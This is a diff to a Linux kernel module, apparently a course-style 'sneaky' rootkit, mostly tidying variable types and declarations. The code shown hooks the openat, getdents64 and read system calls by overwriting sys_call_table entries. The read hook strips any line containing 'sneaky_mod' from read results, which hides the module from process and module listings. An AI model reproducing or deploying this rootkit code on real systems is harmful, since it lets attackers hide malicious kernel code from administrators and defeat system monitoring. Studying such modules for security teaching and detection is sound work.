@@ -51,7 +51,7 @@ int disable_page_rw(void *ptr)
 // openat
 //*****************
 
-asmlinkage int (*original_openat)(struct pt_regs *);
+static asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
@@ -68,7 +68,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 //*****************
 //  getdents64
 //*****************
-asmlinkage int (*original_getdents64)(struct pt_regs *regs);
+static asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 {
@@ -106,26 +106,26 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 //  read
 //*****************
 
-asmlinkage ssize_t  (*original_read)(struct pt_regs *regs);
-asmlinkage ssize_t  sneaky_read(struct pt_regs *regs)
+static asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
+asmlinkage ssize_t sneaky_read(struct pt_regs *regs)
 {
 
-  void *buf = regs->si;
-  ssize_t  nread = original_read(regs);
+  char __user *buf = (char *)regs->si;
+  ssize_t nread = original_read(regs);
   // printk(KERN_INFO "[Sneaky_sys_read]!\n");
 
   if (nread <= 0)
   {
     return nread;
   }
-  void *st = strnstr(buf, "sneaky_mod", nread);
-  if (st != NULL)
+  char *start = strnstr(buf, "sneaky_mod", nread);
+  if (start != NULL)
   {
-    void *ed = strnstr(st, "\n", nread - (st - buf));
-    if (ed != NULL)
+    char *end = strnstr(start, "\n", nread - (start - buf));
+    if (end != NULL)
     {
-      ssize_t len = ed - st + 1;
-      memmove(st, ed + 1, nread - (st - buf) - len);
+      ssize_t len = end - start + 1;
+      memmove(start, end + 1, nread - (start - buf) - len);
       nread -= len;
     }
   }
@@ -156,7 +156,7 @@ static int initialize_sneaky_module(void)
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
   sys_call_table[__NR_read] = (unsigned long)sneaky_read;
-  // Turn write protection mode back on for sys_call_table
+  //  Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
   return 0; // to show a successful load
